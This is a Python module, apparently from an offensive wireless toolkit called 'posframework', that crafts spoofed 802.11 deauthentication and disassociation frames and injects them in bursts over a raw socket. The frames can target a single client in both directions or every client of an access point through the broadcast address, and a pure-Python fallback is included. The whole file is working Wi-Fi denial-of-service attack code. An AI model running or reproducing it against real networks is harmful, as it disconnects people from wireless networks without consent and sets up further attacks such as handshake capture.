"""
posframework.native.deauth_craft - ctypes wrapper for libdeauth_craft.so

Provides fast deauthentication and disassociation frame crafting and
burst injection. Falls back to scapy frame construction if the native
library is not compiled.

Requires root/CAP_NET_RAW for injection. Linux only.
"""

import ctypes
import struct
from ctypes import c_int, c_uint8, c_uint16, c_size_t, POINTER
from typing import Optional

from posframework.config import log
from posframework.native import get_lib

# ─── MAC Address Helpers ───────────────────────────────────────────────────────

_BROADCAST_MAC = b"\xff\xff\xff\xff\xff\xff"


def _mac_to_bytes(mac: str) -> bytes:
    """
    Convert MAC address string 'aa:bb:cc:dd:ee:ff' to 6-byte bytes.

    Args:
        mac: MAC address in colon-separated hex notation

    Returns:
        6-byte MAC address

    Raises:
        ValueError: If MAC format is invalid.
    """
    parts = mac.lower().split(":")
    if len(parts) != 6:
        raise ValueError(f"Invalid MAC address format: {mac}")
    try:
        return bytes(int(p, 16) for p in parts)
    except ValueError:
        raise ValueError(f"Invalid MAC address format: {mac}")


def _bytes_to_mac(data: bytes) -> str:
    """
    Convert 6-byte MAC to string 'aa:bb:cc:dd:ee:ff'.

    Args:
        data: 6 bytes of MAC address

    Returns:
        MAC address string in colon-separated lowercase hex.
    """
    return ":".join(f"{b:02x}" for b in data)


def _mac_to_ctypes(mac: str) -> "ctypes.Array":
    """Convert MAC string to ctypes uint8 array."""
    raw = _mac_to_bytes(mac)
    return (c_uint8 * 6)(*raw)


# ─── Native Library Setup ─────────────────────────────────────────────────────

_lib = get_lib("libdeauth_craft")
_USE_NATIVE = _lib is not None

if _USE_NATIVE:
    # size_t craft_deauth_frame(uint8_t *buf, const uint8_t *sender,
    #                           const uint8_t *receiver, const uint8_t *bssid,
    #                           uint16_t reason)
    _lib.craft_deauth_frame.argtypes = [
        POINTER(c_uint8),
        POINTER(c_uint8),
        POINTER(c_uint8),
        POINTER(c_uint8),
        c_uint16,
    ]
    _lib.craft_deauth_frame.restype = c_size_t

    # size_t craft_disassoc_frame(uint8_t *buf, const uint8_t *sender,
    #                             const uint8_t *receiver, const uint8_t *bssid,
    #                             uint16_t reason)
    _lib.craft_disassoc_frame.argtypes = [
        POINTER(c_uint8),
        POINTER(c_uint8),
        POINTER(c_uint8),
        POINTER(c_uint8),
        c_uint16,
    ]
    _lib.craft_disassoc_frame.restype = c_size_t

    # int deauth_target(int sock_fd, const uint8_t *bssid, const uint8_t *client,
    #                   int burst_count, int bidirectional)
    _lib.deauth_target.argtypes = [
        c_int,
        POINTER(c_uint8),
        POINTER(c_uint8),
        c_int,
        c_int,
    ]
    _lib.deauth_target.restype = c_int

    # int deauth_broadcast(int sock_fd, const uint8_t *bssid, int burst_count)
    _lib.deauth_broadcast.argtypes = [c_int, POINTER(c_uint8), c_int]
    _lib.deauth_broadcast.restype = c_int

    log.debug("deauth_craft: using native C implementation")
else:
    log.warning("deauth_craft: libdeauth_craft.so not available, using scapy fallback")


# ─── Frame Crafting Constants ──────────────────────────────────────────────────

# Minimal 8-byte radiotap header (version 0, no fields)
_RADIOTAP_HEADER = b"\x00\x00\x08\x00\x00\x00\x00\x00"

# 802.11 frame type/subtype for deauth (0x00c0) and disassoc (0x00a0)
_DEAUTH_TYPE = 0x00C0
_DISASSOC_TYPE = 0x00A0


# ─── Public API ────────────────────────────────────────────────────────────────

def craft_deauth(
    sender: str, receiver: str, bssid: str, reason: int = 7
) -> bytes:
    """
    Craft a deauthentication frame with RadioTap header.

    Args:
        sender: Source MAC address (e.g., 'aa:bb:cc:dd:ee:ff')
        receiver: Destination MAC address
        bssid: BSSID MAC address
        reason: Deauth reason code (default: 7 = Class 3 frame from nonassociated STA)

    Returns:
        Complete frame bytes (radiotap + deauth frame) ready for injection.
    """
    if _USE_NATIVE:
        buf = (c_uint8 * 64)()  # More than enough for deauth frame
        sender_arr = _mac_to_ctypes(sender)
        receiver_arr = _mac_to_ctypes(receiver)
        bssid_arr = _mac_to_ctypes(bssid)

        frame_len = _lib.craft_deauth_frame(
            buf, sender_arr, receiver_arr, bssid_arr, reason
        )
        return bytes(buf[:frame_len])
    else:
        return _scapy_craft_deauth(sender, receiver, bssid, reason)


def craft_disassoc(
    sender: str, receiver: str, bssid: str, reason: int = 8
) -> bytes:
    """
    Craft a disassociation frame with RadioTap header.

    Args:
        sender: Source MAC address (e.g., 'aa:bb:cc:dd:ee:ff')
        receiver: Destination MAC address
        bssid: BSSID MAC address
        reason: Disassoc reason code (default: 8 = Disassociated because sending STA is leaving)

    Returns:
        Complete frame bytes (radiotap + disassoc frame) ready for injection.
    """
    if _USE_NATIVE:
        buf = (c_uint8 * 64)()
        sender_arr = _mac_to_ctypes(sender)
        receiver_arr = _mac_to_ctypes(receiver)
        bssid_arr = _mac_to_ctypes(bssid)

        frame_len = _lib.craft_disassoc_frame(
            buf, sender_arr, receiver_arr, bssid_arr, reason
        )
        return bytes(buf[:frame_len])
    else:
        return _scapy_craft_disassoc(sender, receiver, bssid, reason)


def deauth_target(
    sock_fd: int,
    bssid: str,
    client: str,
    burst: int = 5,
    bidirectional: bool = True,
) -> int:
    """
    Send a burst of deauth frames targeting a specific client.

    Args:
        sock_fd: Raw socket file descriptor (from RawSocket.init_raw_socket)
        bssid: AP BSSID MAC address
        client: Target client MAC address
        burst: Number of deauth frames per direction (default: 5)
        bidirectional: Send in both directions AP->client and client->AP (default: True)

    Returns:
        Number of frames successfully sent, -1 on fatal error.
    """
    if _USE_NATIVE:
        bssid_arr = _mac_to_ctypes(bssid)
        client_arr = _mac_to_ctypes(client)
        result = _lib.deauth_target(
            sock_fd, bssid_arr, client_arr, burst, 1 if bidirectional else 0
        )
        if result < 0:
            log.warning(
                f"deauth_craft: deauth_target failed "
                f"(bssid={bssid}, client={client})"
            )
        return result
    else:
        return _scapy_deauth_target(sock_fd, bssid, client, burst, bidirectional)


def deauth_broadcast(sock_fd: int, bssid: str, burst: int = 5) -> int:
    """
    Send broadcast deauth frames (AP to broadcast address).

    Args:
        sock_fd: Raw socket file descriptor (from RawSocket.init_raw_socket)
        bssid: AP BSSID MAC address
        burst: Number of deauth frames to send (default: 5)

    Returns:
        Number of frames successfully sent, -1 on fatal error.
    """
    if _USE_NATIVE:
        bssid_arr = _mac_to_ctypes(bssid)
        result = _lib.deauth_broadcast(sock_fd, bssid_arr, burst)
        if result < 0:
            log.warning(f"deauth_craft: deauth_broadcast failed (bssid={bssid})")
        return result
    else:
        return _scapy_deauth_broadcast(sock_fd, bssid, burst)


# ─── Scapy Fallback Implementations ───────────────────────────────────────────

def _build_deauth_raw(sender: str, receiver: str, bssid: str, reason: int) -> bytes:
    """Build raw deauth frame bytes without scapy (pure Python fallback)."""
    # Radiotap header
    frame = bytearray(_RADIOTAP_HEADER)

    # Frame control: deauth = 0x00c0 (LE)
    frame += struct.pack("<H", _DEAUTH_TYPE)
    # Duration
    frame += struct.pack("<H", 0)
    # Addr1 (receiver), Addr2 (sender), Addr3 (bssid)
    frame += _mac_to_bytes(receiver)
    frame += _mac_to_bytes(sender)
    frame += _mac_to_bytes(bssid)
    # Sequence control
    frame += struct.pack("<H", 0)
    # Reason code
    frame += struct.pack("<H", reason)

    return bytes(frame)


def _build_disassoc_raw(sender: str, receiver: str, bssid: str, reason: int) -> bytes:
    """Build raw disassoc frame bytes without scapy (pure Python fallback)."""
    frame = bytearray(_RADIOTAP_HEADER)
    frame += struct.pack("<H", _DISASSOC_TYPE)
    frame += struct.pack("<H", 0)
    frame += _mac_to_bytes(receiver)
    frame += _mac_to_bytes(sender)
    frame += _mac_to_bytes(bssid)
    frame += struct.pack("<H", 0)
    frame += struct.pack("<H", reason)
    return bytes(frame)


def _scapy_craft_deauth(sender: str, receiver: str, bssid: str, reason: int) -> bytes:
    """Craft deauth frame using scapy (or fall back to raw construction)."""
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth
        pkt = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=12,
                addr1=receiver,
                addr2=sender,
                addr3=bssid,
            )
            / Dot11Deauth(reason=reason)
        )
        return bytes(pkt)
    except ImportError:
        log.debug("deauth_craft: scapy not available, using raw frame construction")
        return _build_deauth_raw(sender, receiver, bssid, reason)


def _scapy_craft_disassoc(sender: str, receiver: str, bssid: str, reason: int) -> bytes:
    """Craft disassoc frame using scapy (or fall back to raw construction)."""
    try:
        from scapy.all import RadioTap, Dot11, Dot11Disas
        pkt = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=10,
                addr1=receiver,
                addr2=sender,
                addr3=bssid,
            )
            / Dot11Disas(reason=reason)
        )
        return bytes(pkt)
    except ImportError:
        log.debug("deauth_craft: scapy not available, using raw frame construction")
        return _build_disassoc_raw(sender, receiver, bssid, reason)


def _scapy_deauth_target(
    sock_fd: int, bssid: str, client: str, burst: int, bidirectional: bool
) -> int:
    """Send deauth burst using scapy or raw socket write (fallback)."""
    import os

    sent = 0
    for _ in range(burst):
        # AP -> Client
        frame = _build_deauth_raw(bssid, client, bssid, 7)
        try:
            os.write(sock_fd, frame)
            sent += 1
        except OSError as e:
            log.warning(f"deauth_craft: write failed: {e}")
            return -1 if sent == 0 else sent

        if bidirectional:
            # Client -> AP
            frame = _build_deauth_raw(client, bssid, bssid, 7)
            try:
                os.write(sock_fd, frame)
                sent += 1
            except OSError as e:
                log.warning(f"deauth_craft: write failed: {e}")
                return sent

    return sent


def _scapy_deauth_broadcast(sock_fd: int, bssid: str, burst: int) -> int:
    """Send broadcast deauth burst using raw socket write (fallback)."""
    import os

    broadcast = "ff:ff:ff:ff:ff:ff"
    sent = 0
    for _ in range(burst):
        frame = _build_deauth_raw(bssid, broadcast, bssid, 7)
        try:
            os.write(sock_fd, frame)
            sent += 1
        except OSError as e:
            log.warning(f"deauth_craft: write failed: {e}")
            return -1 if sent == 0 else sent

    return sent
